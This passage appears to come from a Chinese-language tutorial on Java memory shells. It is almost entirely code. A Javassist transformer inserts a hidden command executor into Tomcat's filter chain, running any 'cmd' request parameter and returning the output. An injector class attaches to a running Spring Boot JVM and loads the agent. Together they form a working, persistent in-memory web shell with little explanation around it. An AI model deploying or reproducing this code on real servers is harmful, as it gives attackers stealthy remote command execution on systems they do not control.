//写shell的实现
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class definetransform implements ClassFileTransformer {
    public static final String editClassName = "org.apache.catalina.core.ApplicationFilterChain";
    //public static final String editClassName = "org.apache.tomcat.websocket.server.WsFilter";
    public static final String editMethod = "doFilter";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try{
            ClassPool cp = ClassPool.getDefault();
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                cp.insertClassPath(ccp);
                CtClass ctc = cp.get(editClassName);
                CtMethod method = ctc.getDeclaredMethod(editMethod);
                String source = "javax.servlet.http.HttpServletRequest req =  request;\n"+
                        "javax.servlet.http.HttpServletResponse res = response;\n"+
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n"+
                        "if(cmd != null){\n"+
                        "   try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().print(sb.toString());\n" +
                        "        response.getOutputStream().flush();\n" +
                        "        response.getOutputStream().close();\n" +
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}";
                method.insertBefore(source);
                byte[] bytes = ctc.toBytecode();
                ctc.detach();
                return bytes;
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
```

inject.java 将注入写到static代码块，编译为class

```java
import java.io.File;
import java.net.URL;
import java.net.URLClassLoader;
//agent的注入
public class inject {
    static {
        String agentpath = "C:\\Users\\cys\\Desktop\\memoryshell\\agent.jar";
        String toolsjarpath = System.getProperty("java.home").replace("jre","lib") + File.separator + "tools.jar";
        File toolsjar = new File(toolsjarpath);
        URL url = null;
        try{
            url = toolsjar.toURI().toURL();
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}, null);
            // 加载virtualmachine
            Class<?> virtualMachine = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> VirtualMachineDescriptor = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = virtualMachine.getDeclaredMethod("list",new Class[]{});
            java.util.List<Object> pidlist = (java.util.List<Object>) listMethod.invoke(null, new Object[]{});
            for (int i = 0; i < pidlist.size(); i++) {
                Object o = pidlist.get(i);
                java.lang.reflect.Method displayName = o.getClass().getSuperclass().getDeclaredMethod("displayName");
                Object name = displayName.invoke(o, new Object[]{});
                // 0x04 找到Tomcat进程，attach
                if (name.toString().contains("com.example.SpringbootApplication")) {
                    java.lang.reflect.Method attach = virtualMachine.getDeclaredMethod("attach", new Class[]{VirtualMachineDescriptor});
                    // 这里调的attch重载方法，attach可以通过pid也可通过相关jvm进程的vrtualMachineDescriptor对象传参
                    Object machin = attach.invoke(virtualMachine, new Object[]{o});
                    // 0x05 loadAgent
                    java.lang.reflect.Method loadAgent = machin.getClass().getSuperclass().getSuperclass().getDeclaredMethod("loadAgent", new Class[]{String.class});
                    loadAgent.invoke(machin, new Object[]{agentpath});
                    //0x06 detach
                    java.lang.reflect.Method detach = virtualMachine.getDeclaredMethod("detach", new Class[]{});
                    detach.invoke(machin, new Object[]{});
                    break;
                }
            }

        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}
